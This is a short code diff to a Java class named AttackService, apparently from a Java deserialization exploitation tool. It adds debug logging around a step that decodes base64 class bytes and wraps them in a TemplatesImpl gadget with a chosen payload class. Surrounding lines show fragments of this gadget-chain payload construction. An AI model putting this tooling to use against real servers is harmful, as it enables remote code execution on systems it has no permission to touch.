@@ -1172,6 +1172,10 @@ public class AttackService {
                 if (raw != null && raw.length() > 80 && raw.startsWith("yv66vg")) {
                     try {
                         byte[] classBytes = Base64.decode(raw.trim());
+                        AppLogger.info("[jEG] classBytes length=" + classBytes.length + ", model=" + modelType);
+                        // 检查字节码父类
+                        String bcStr = new String(classBytes, "ISO-8859-1");
+                        AppLogger.info("[jEG] contains AbstractTranslet=" + bcStr.contains("AbstractTranslet"));
                         Object template = Gadgets.createTemplatesImpl(classBytes);
                         Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(legacyGadget);
                         this.mainController.logTextArea.appendText(Utils.log("[jEG] gadgetClazz=" + (gadgetClazz != null ? gadgetClazz.getName() : "null")));
